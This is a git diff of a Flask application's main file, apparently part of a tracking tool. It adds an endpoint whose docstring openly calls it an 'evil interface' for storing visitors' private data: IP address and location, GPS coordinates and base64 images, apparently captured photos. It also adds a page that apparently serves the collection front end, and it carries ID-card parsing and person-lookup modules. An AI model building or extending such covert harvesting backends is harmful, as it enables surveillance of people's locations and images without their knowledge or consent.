@@ -3,20 +3,23 @@
 '''
 Author: whalefall
 Date: 2021-08-20 03:02:54
-LastEditTime: 2021-08-25 11:51:42
+LastEditTime: 2021-08-26 18:23:51
 Description: Flask主文件
 '''
 from typing import Any, Union
 from flask import *
+from requests.api import get
 from daniCheck import dani
+from admin import admin
 from flask import redirect, url_for, request, Response, render_template
 from pathlib import Path
 import base64
 from pydantic import BaseModel
 import time
 from utils.sysinfo import sysinfo
-from utils.uploadGithub import upload_catch_pic
+from utils.uploadGithub import upload_catch_pic,save_base64_pic
 from utils.parse_idcard import parseID, ParseIdResult
+from utils.write_log import SeeInfo, Sql_log
 import threading
 
 
@@ -33,11 +36,24 @@ class BaseResp(BaseModel):
     data: Any = None  # 响应信息
 
 
+def dontreturn(func):
+    '''函数如果错误就返回原因与请求的装饰器'''
+    def inner(*args, **kwargs):
+        try:
+            return func(*args, **kwargs)
+        except Exception as e:
+            return resp_parse(BaseResp(code=201, msg=f'通用接口错误,{e}'))
+    return inner
+
+
 app = Flask(__name__, template_folder='templates', static_folder='static')
 app.config.from_pyfile('setting.py')
 
 # 注册大沥查人蓝图
 app.register_blueprint(dani)
+
+# 注册后台管理蓝图
+app.register_blueprint(admin)
 
 
 def resp_parse(resp):
@@ -68,26 +84,48 @@ def upload():
     base64_pic = req_data.get('base64')
     if base64_pic:
         try:
-            pic_path = Path(app.config['PROJECT_PATH'], "static",
-                            "catch")
-            pic_path.mkdir(exist_ok=True)
-            file_name = int(time.time())
-            pic_path = pic_path.joinpath('%s.jpg' % (file_name))
-            with open(pic_path, "wb") as p:
-                p.write(base64.b64decode(base64_pic))
+            save_base64_pic(base64_pic)
             r = RespUpload(code=200, msg="up suc!")
         except Exception as e:
             r = RespUpload(code=501, msg=f"Up error {e}")
-        else:
-            # 无异常的时候新建线程上传图片
-            t = threading.Thread(target=upload_catch_pic,
-                                 args=(pic_path, file_name,))
-            t.start()
-            print("上传线程已建立")
         finally:
             return resp_parse(r)
 
     return resp_parse(RespUpload(code=502, msg="无内容?"))
+
+
+@app.route('/upload_info/', methods=['POST', 'GET'])
+@dontreturn
+def upload_info():
+    '''上传各种隐私数据并传入数据库log.db的邪恶接口
+    传入参数:
+    {ip:{ip,where},gps:{x(经度),y(纬度)},base64:base64图片}
+    '''
+    # upload_data = request_parse(request)
+    upload_data = request.get_json()
+    i = SeeInfo(
+        timestamp=int(time.time()),
+        ip=upload_data['ip']['ip'],
+        ip_addr=upload_data['ip']['where'],
+        gps_addr="%s,%s" % (upload_data.get('gps').get(
+            'x'), upload_data.get('gps').get('y')),
+        base64_pic=upload_data.get('base64')
+    )
+    sqlbot = Sql_log()
+    sqlbot.insert(i)
+    if i.base64_pic:
+        try:
+            save_base64_pic(i.base64_pic,file_name=i.timestamp)
+            print('图片写入成功')
+        except:
+            pass
+
+    return resp_parse(BaseResp(msg='upload suc'))
+
+
+@app.route('/getlookinfo/', methods=['GET'])
+def get_index():
+    return render_template('getlookinfo.html')
 
 
 @app.route('/sysinfo/', methods=["GET"])
